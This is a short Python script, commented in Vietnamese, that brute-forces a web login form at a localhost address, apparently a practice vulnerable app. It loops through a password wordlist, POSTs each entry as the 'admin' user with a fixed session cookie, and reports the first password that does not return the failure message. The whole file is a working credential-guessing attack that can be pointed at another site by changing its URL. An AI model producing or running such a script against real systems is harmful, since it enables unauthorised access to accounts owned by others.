import requests

# Các thông tin cần chỉnh sửa
url = "http://localhost:8888/index.php?page=login.php"
cookie = "PHPSESSID=ssqqm7mhfll5c6sao5561l29i3"
passwords_file = "unix_passwords.txt"

# Đọc danh sách mật khẩu từ tệp
with open(passwords_file, "r") as file:
    passwords = file.readlines()

# Lặp qua từng mật khẩu trong danh sách
for password in passwords:
    password = password.strip()  # Xóa ký tự xuống dòng

    # Tạo dữ liệu đăng nhập
    data = {
        "username": "admin",
        "password": password,
        "Login": "Login"
    }

    # Gửi yêu cầu POST để đăng nhập
    response = requests.post(url, data=data, headers={"Cookie": cookie})

    # Kiểm tra phản hồi
    if "Invalid username or password!" not in response.text:
        print(f"Password found: {password}")
        break
